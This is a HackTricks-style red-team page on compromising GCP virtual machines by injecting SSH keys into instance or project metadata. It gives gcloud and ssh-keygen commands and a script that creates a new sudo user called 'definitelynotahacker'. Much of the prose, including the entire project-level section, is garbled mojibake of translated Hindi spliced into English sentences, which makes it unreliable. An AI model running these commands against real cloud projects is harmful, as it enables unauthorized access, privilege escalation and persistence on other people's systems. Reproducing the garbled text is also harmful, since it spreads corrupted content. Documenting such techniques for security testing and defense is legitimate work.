# GCP - Add Custom SSH Metadata

## GCP - Add Custom SSH Metadata

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Modifying the metadata <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Metadata modification on an instance could lead to **рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЖрд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ**.

#### **Incorporation of SSH Keys into Custom Metadata**

On GCP, **Linux systems** often execute scripts from the [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). A critical component of this is the [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), which is designed to **рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪрдирд╛** the instance metadata endpoint for **рдЕрдзрд┐рдХреГрдд SSH рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдкрдбреЗрдЯ**.

Therefore, if an attacker can modify custom metadata, he could make the the daemon find a new public key, which will processed and **рд╕реНрдерд╛рдиреАрдп рдкреНрд░рдгрд╛рд▓реА рдореЗрдВ рдПрдХреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**. The key will be added into `~/.ssh/authorized_keys` file of an **рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ `sudo` рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдирд╛**, depending on the key's format. And the attacker will be able to compromise the host.

#### **Add SSH key to existing privileged user**

1. **Examine Existing SSH Keys on the Instance:**
*   Execute the command to describe the instance and its metadata to locate existing SSH keys. The relevant section in the output will be under `metadata`, specifically the `ssh-keys` key.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* Pay attention to the format of the SSH keys: the username precedes the key, separated by a colon.
2. **Prepare a Text File for SSH Key Metadata:**
* Save the details of usernames and their corresponding SSH keys into a text file named `meta.txt`. This is essential for preserving the existing keys while adding new ones.
3. **Generate a New SSH Key for the Target User (`alice` in this example):**
*   Use the `ssh-keygen` command to generate a new SSH key, ensuring that the comment field (`-C`) matches the target username.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* Add the new public key to `meta.txt`, mimicking the format found in the instance's metadata.
4. **Update the Instance's SSH Key Metadata:**
*   Apply the updated SSH key metadata to the instance using the `gcloud compute instances add-metadata` command.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **Access the Instance Using the New SSH Key:**
*   Connect to the instance with SSH using the new key, accessing the shell in the context of the target user (`alice` in this example).

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **Create a new privileged user and add a SSH key**

If no interesting user is found, it's possible to create a new one which will be given `sudo` privileges:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### SSH keys at project level <a href="#sshing-around" id="sshing-around"></a>

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ SSH рдкрд╣реБрдБрдЪ рдХреЛ рдПрдХ рдХреНрд▓рд╛рдЙрдб рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХрдИ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ (VMs) рддрдХ рдмрдврд╝рд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ **рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реНрддрд░ рдкрд░ SSH рдХреБрдВрдЬреА рд▓рд╛рдЧреВ рдХрд░рдХреЗ**ред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рднреА рдЙрджрд╛рд╣рд░рдг рддрдХ SSH рдкрд╣реБрдБрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдиреЗ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдкрд░рд┐рдпреЛрдЬрдирд╛-рд╡реНрдпрд╛рдкреА SSH рдХреБрдВрдЬреА рдХреЛ рдЕрд╡рд░реБрджреНрдз рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реИред рдпрд╣рд╛рдБ рдПрдХ рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛ рд╣реИ:

1. **рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реНрддрд░ рдкрд░ SSH рдХреБрдВрдЬреА рд▓рд╛рдЧреВ рдХрд░реЗрдВ:**
*   `gcloud compute project-info add-metadata` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `meta.txt` рд╕реЗ SSH рдХреБрдВрдЬреА рдХреЛ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдореЗрдВ рдЬреЛрдбрд╝реЗрдВред рдпрд╣ рдХреНрд░рд┐рдпрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ SSH рдХреБрдВрдЬреА рдкрд░рд┐рдпреЛрдЬрдирд╛ рдореЗрдВ рд╕рднреА VMs рдХреЗ рдмреАрдЪ рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реИрдВ, рдЬрдм рддрдХ рдХрд┐ рдХрд┐рд╕реА VM рдореЗрдВ "рдмреНрд▓реЙрдХ рдкреНрд░реЛрдЬреЗрдХреНрдЯ-рд╡реНрдпрд╛рдкреА SSH рдХреБрдВрдЬреА" рд╡рд┐рдХрд▓реНрдк рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИред

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **рдкрд░рд┐рдпреЛрдЬрдирд╛-рд╡реНрдпрд╛рдкреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ SSH рдХрд░реЗрдВ:**
* рдкрд░рд┐рдпреЛрдЬрдирд╛-рд╡реНрдпрд╛рдкреА SSH рдХреБрдВрдЬреА рд▓рд╛рдЧреВ рд╣реЛрдиреЗ рдХреЗ рд╕рд╛рде, рдЖрдк рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рднреА рдЙрджрд╛рд╣рд░рдг рдореЗрдВ SSH рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЬреЛ рдЙрджрд╛рд╣рд░рдг рдкрд░рд┐рдпреЛрдЬрдирд╛-рд╡реНрдпрд╛рдкреА рдХреБрдВрдЬреА рдХреЛ рдЕрд╡рд░реБрджреНрдз рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ SSH рдХреБрдВрдЬреА рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВрдЧреЗ, рдЬрд┐рд╕рд╕реЗ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧреАред
* рдХрд┐рд╕реА рдЙрджрд╛рд╣рд░рдг рдореЗрдВ SSH рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╕реАрдзрд╛ рддрд░реАрдХрд╛ `gcloud compute ssh [INSTANCE]` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рдпрд╣ рдХрдорд╛рдВрдб рдЖрдкрдХреЗ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реНрддрд░ рдкрд░ рд╕реЗрдЯ рдХреА рдЧрдИ SSH рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред

## References

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
